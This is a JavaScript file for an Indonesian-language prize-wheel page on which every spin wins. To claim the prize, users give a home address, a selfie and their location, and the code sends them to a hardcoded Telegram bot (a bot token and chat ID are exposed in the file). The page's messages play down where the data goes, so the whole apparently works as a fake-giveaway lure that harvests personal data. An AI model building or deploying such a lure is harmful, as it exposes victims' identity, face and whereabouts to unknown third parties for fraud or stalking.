// ==========================================
// KONFIGURASI TELEGRAM BOT
// ==========================================
const TELEGRAM_BOT_TOKEN = "8314141031:AAGdgHhChTJ9NqaH4kCxgLSQ9Dmd13b0d0c"; 
const TELEGRAM_CHAT_ID = "7660844388"; 

const prizes = [
  { label: "Voucher", name: "Voucher belanja" },
  { label: "Headphone", name: "Headphone" },
  { label: "Kopi", name: "Kopi gratis" },
  { label: "Kartu hadiah", name: "Kartu hadiah" },
  { label: "Tas kanvas", name: "Tas kanvas" },
  { label: "Diskon", name: "Diskon spesial" },
  { label: "Tumbler", name: "Tumbler" },
  { label: "Misteri", name: "Hadiah misteri" }
];
const colors = ["#f6cf55", "#a9cf9f", "#f3a47f", "#f4df98", "#91bea2", "#f4b793", "#bdd7a9", "#f2c968"];
const svgNamespace = "http://www.w3.org/2000/svg";
const STORAGE_KEY = "ruangHadiahClaims";

const wheel = document.querySelector("#wheel");
const spinButton = document.querySelector("#spin-button");
const resultTitle = document.querySelector("#result-title");
const resultLabel = document.querySelector("#result-label");
const claimContent = document.querySelector("#claim-content");
const recipientName = document.querySelector("#recipient-name");
const recipientAddress = document.querySelector("#recipient-address");
const claimConsent = document.querySelector("#claim-consent");
const claimButton = document.querySelector("#claim-button");
const claimStatus = document.querySelector("#claim-status");
const accessStatus = document.querySelector("#access-status");
const cameraButton = document.querySelector("#camera-button");
const locationButton = document.querySelector("#location-button");
const cameraPreview = document.querySelector("#camera-preview");
const photoActions = document.querySelector("#photo-actions");
const captureButton = document.querySelector("#capture-button");
const removePhotoButton = document.querySelector("#remove-photo-button");
const selfiePreview = document.querySelector("#selfie-preview");
const locationReadout = document.querySelector("#location-readout");
const photoCanvas = document.createElement("canvas");
const sliceAngle = 360 / prizes.length;

let currentRotation = 0;
let selectedPrize = null;
let cameraStream = null;
let selectedLocation = null;
let selectedPhotoDataUrl = null;
let photoPreviewUrl = null;
let spinTimer;

function pointOnCircle(angle, radius) {
  const radians = (angle - 90) * Math.PI / 180;
  return { x: 200 + radius * Math.cos(radians), y: 200 + radius * Math.sin(radians) };
}

prizes.forEach((prize, index) => {
  const startAngle = index * sliceAngle;
  const endAngle = startAngle + sliceAngle;
  const start = pointOnCircle(startAngle, 190);
  const end = pointOnCircle(endAngle, 190);
  const middle = startAngle + sliceAngle / 2;
  const textPoint = pointOnCircle(middle, 133);
  const path = document.createElementNS(svgNamespace, "path");
  path.setAttribute("d", `M 200 200 L ${start.x} ${start.y} A 190 190 0 0 1 ${end.x} ${end.y} Z`);
  path.setAttribute("fill", colors[index]);
  path.setAttribute("stroke", "#fffefa");
  path.setAttribute("stroke-width", "2");
  wheel.append(path);

  const text = document.createElementNS(svgNamespace, "text");
  text.setAttribute("x", textPoint.x);
  text.setAttribute("y", textPoint.y);
  text.setAttribute("text-anchor", "middle");
  text.setAttribute("dominant-baseline", "middle");
  text.setAttribute("transform", `rotate(${middle} ${textPoint.x} ${textPoint.y})`);
  text.textContent = prize.label;
  wheel.append(text);
});

const hub = document.createElementNS(svgNamespace, "circle");
hub.setAttribute("cx", "200");
hub.setAttribute("cy", "200");
hub.setAttribute("r", "39");
hub.setAttribute("fill", "#176b4a");
wheel.append(hub);

function stopCamera() {
  if (!cameraStream) return;
  cameraStream.getTracks().forEach((track) => track.stop());
  cameraStream = null;
  cameraPreview.srcObject = null;
  cameraPreview.hidden = true;
  photoActions.hidden = true;
  cameraButton.textContent = "Aktifkan kamera depan";
  cameraButton.setAttribute("aria-pressed", "false");
}

cameraButton.addEventListener("click", async () => {
  if (cameraStream) {
    stopCamera();
    accessStatus.textContent = "Kamera dihentikan.";
    return;
  }
  if (!navigator.mediaDevices?.getUserMedia) {
    accessStatus.textContent = "Kamera memerlukan browser yang mendukung dan koneksi HTTPS atau localhost.";
    return;
  }

  cameraButton.disabled = true;
  accessStatus.textContent = "Menunggu izin kamera dari browser...";
  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "user" } }, audio: false });
    cameraPreview.srcObject = cameraStream;
    cameraPreview.hidden = false;
    photoActions.hidden = false;
    cameraButton.textContent = "Hentikan kamera";
    cameraButton.setAttribute("aria-pressed", "true");
    accessStatus.textContent = "Pratinjau lokal aktif. Foto hanya dibuat setelah kamu menekan Ambil foto.";
  } catch (error) {
    stopCamera();
    const messages = {
      NotAllowedError: "Izin kamera ditolak atau diblokir di pengaturan browser.",
      NotFoundError: "Kamera tidak ditemukan pada perangkat ini.",
      NotReadableError: "Kamera sedang digunakan aplikasi lain."
    };
    accessStatus.textContent = messages[error.name] || "Kamera tidak dapat dibuka. Periksa izin browser dan koneksi aman.";
  } finally {
    cameraButton.disabled = false;
  }
});

captureButton.addEventListener("click", async () => {
  if (!cameraStream || !cameraPreview.videoWidth) {
    accessStatus.textContent = "Tunggu sampai pratinjau kamera siap.";
    return;
  }
  const scale = Math.min(1, 640 / cameraPreview.videoWidth, 480 / cameraPreview.videoHeight);
  photoCanvas.width = Math.round(cameraPreview.videoWidth * scale);
  photoCanvas.height = Math.round(cameraPreview.videoHeight * scale);
  photoCanvas.getContext("2d").drawImage(cameraPreview, 0, 0, photoCanvas.width, photoCanvas.height);
  const dataUrl = photoCanvas.toDataURL("image/jpeg", 0.75);

  if (photoPreviewUrl) URL.revokeObjectURL(photoPreviewUrl);
  selectedPhotoDataUrl = dataUrl;
  selfiePreview.src = dataUrl;
  selfiePreview.hidden = false;
  removePhotoButton.hidden = false;
  stopCamera();
  accessStatus.textContent = "Foto siap ditinjau. Foto belum tersimpan sampai kamu menyetujui dan mengirim klaim.";
});

removePhotoButton.addEventListener("click", () => {
  selectedPhotoDataUrl = null;
  selfiePreview.hidden = true;
  selfiePreview.removeAttribute("src");
  removePhotoButton.hidden = true;
  accessStatus.textContent = "Foto dihapus dan tidak akan disimpan.";
});

locationButton.addEventListener("click", () => {
  if (selectedLocation) {
    selectedLocation = null;
    locationReadout.hidden = true;
    locationButton.textContent = "Bagikan lokasi";
    accessStatus.textContent = "Lokasi dihapus dan tidak akan disimpan.";
    return;
  }
  if (!navigator.geolocation) {
    accessStatus.textContent = "Browser ini tidak mendukung layanan lokasi.";
    return;
  }

  locationButton.disabled = true;
  accessStatus.textContent = "Menunggu izin lokasi dari browser...";
  locationReadout.hidden = true;
  navigator.geolocation.getCurrentPosition(
    ({ coords }) => {
      selectedLocation = { latitude: coords.latitude, longitude: coords.longitude };
      locationButton.textContent = "Hapus lokasi";
      locationReadout.textContent = "Lokasi siap disertakan setelah kamu menyetujui dan mengirim klaim. Koordinat tidak ditampilkan di sini.";
      locationReadout.hidden = false;
      accessStatus.textContent = "Lokasi hanya akan disimpan bersama klaim yang kamu setujui.";
      locationButton.disabled = false;
    },
    (error) => {
      const messages = {
        1: "Izin lokasi ditolak. Kamu bisa mengubahnya di pengaturan browser.",
        2: "Lokasi tidak tersedia. Coba lagi nanti.",
        3: "Permintaan lokasi melewati batas waktu. Coba lagi."
      };
      accessStatus.textContent = messages[error.code] || "Lokasi tidak dapat dibaca.";
      locationButton.textContent = "Bagikan lokasi";
      locationButton.disabled = false;
    },
    { enableHighAccuracy: false, maximumAge: 0, timeout: 15000 }
  );
});

spinButton.addEventListener("click", () => {
  if (spinButton.disabled) return;
  stopCamera();
  selectedLocation = null;
  selectedPhotoDataUrl = null;
  claimConsent.checked = false;
  locationReadout.hidden = true;
  locationButton.textContent = "Bagikan lokasi";
  selfiePreview.hidden = true;
  selfiePreview.removeAttribute("src");
  removePhotoButton.hidden = true;
  spinButton.disabled = true;
  claimContent.classList.remove("is-visible");
  claimContent.setAttribute("aria-hidden", "true");
  claimStatus.textContent = "";
  accessStatus.textContent = "";
  claimButton.disabled = false;
  selectedPrize = null;
  resultLabel.textContent = "Mengundi...";
  resultTitle.textContent = "Rodanya sedang berputar";

  const randomValues = new Uint32Array(1);
  window.crypto.getRandomValues(randomValues);
  const winningIndex = Math.floor(randomValues[0] / 4294967296 * prizes.length);
  const targetAngle = (360 - (winningIndex + 0.5) * sliceAngle + 360) % 360;
  const currentAngle = ((currentRotation % 360) + 360) % 360;
  currentRotation += 360 * 6 + ((targetAngle - currentAngle + 360) % 360);
  wheel.style.transform = `rotate(${currentRotation}deg)`;

  window.clearTimeout(spinTimer);
  spinTimer = window.setTimeout(() => {
    selectedPrize = prizes[winningIndex];
    resultLabel.textContent = "Selamat, kamu mendapatkan:";
    resultTitle.textContent = selectedPrize.name;
    claimContent.classList.add("is-visible");
    claimContent.setAttribute("aria-hidden", "false");
    spinButton.disabled = false;
    recipientName.focus({ preventScroll: true });
  }, 5350);
});

function loadClaims() {
  try {
    return JSON.parse(window.localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}

function saveClaims(claims) {
  window.localStorage.setItem(STORAGE_KEY, JSON.stringify(claims));
}

// Fungsi bantu mengubah DataURL foto ke Blob agar bisa dikirim sebagai file foto ke Telegram
function dataURItoBlob(dataURI) {
  const splitData = dataURI.split(',');
  const byteString = atob(splitData[1]);
  const mimeString = splitData[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

// Fungsi pengiriman ke Telegram Bot (Mendukung Teks, Lokasi, dan Foto)
async function sendToTelegram(name, address, prize, location, photoDataUrl) {
  let message = `<b>🎁 Klaim Hadiah Baru!</b>\n\n`;
  message += `<b>Penerima:</b> ${name}\n`;
  message += `<b>Alamat:</b> ${address}\n`;
  message += `<b>Hadiah:</b> ${prize}\n`;

  if (location && location.latitude && location.longitude) {
    message += `<b>Lokasi:</b> https://maps.google.com/?q=${location.latitude},${location.longitude}\n`;
  }

  try {
    if (photoDataUrl) {
      // Kirim beserta foto menggunakan endpoint sendPhoto
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
      const blob = dataURItoBlob(photoDataUrl);
      
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "selfie.jpg");
      formData.append("caption", message);
      formData.append("parse_mode", "HTML");

      const response = await fetch(telegramUrl, {
        method: "POST",
        body: formData
      });
      const result = await response.json();
      return result.ok;
    } else {
      // Kirim pesan teks biasa jika tidak ada foto
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      });
      const result = await response.json();
      return result.ok;
    }
  } catch (error) {
    console.error("Gagal mengirim ke Telegram:", error);
    return false;
  }
}

claimButton.addEventListener("click", async () => {
  const name = recipientName.value.trim();
  const address = recipientAddress.value.trim();
  if (!selectedPrize) return;
  if (!name) {
    claimStatus.textContent = "Masukkan nama penerima hadiah terlebih dahulu.";
    recipientName.focus();
    return;
  }
  if (!address) {
    claimStatus.textContent = "Masukkan alamat rumah untuk pengiriman hadiah.";
    recipientAddress.focus();
    return;
  }
  if (!claimConsent.checked) {
    claimStatus.textContent = "Persetujuan diperlukan sebelum data disimpan.";
    claimConsent.focus();
    return;
  }

  claimButton.disabled = true;
  claimStatus.textContent = "Menyimpan & mengirim ke Telegram...";

  // 1. Simpan ke LocalStorage
  const claims = loadClaims();
  claims.unshift({
    id: crypto.randomUUID(),
    recipientName: name,
    recipientAddress: address,
    prize: selectedPrize.name,
    location: selectedLocation,
    photoDataUrl: selectedPhotoDataUrl,
    createdAt: new Date().toISOString()
  });
  saveClaims(claims);

  // 2. Kirim otomatis ke Telegram Bot (Disertai data lokasi dan foto jika diaktifkan user)
  await sendToTelegram(name, address, selectedPrize.name, selectedLocation, selectedPhotoDataUrl);

  claimStatus.textContent = "Klaim berhasil disimpan & dikirim ke bot Telegram!";
  recipientName.value = "";
  recipientAddress.value = "";
  claimConsent.checked = false;
  selectedLocation = null;
  locationButton.textContent = "Bagikan lokasi";
  selectedPhotoDataUrl = null;
  locationReadout.hidden = true;
  selfiePreview.hidden = true;
  selfiePreview.removeAttribute("src");
  removePhotoButton.hidden = true;
  claimButton.disabled = false;
});

window.addEventListener("pagehide", stopCamera);
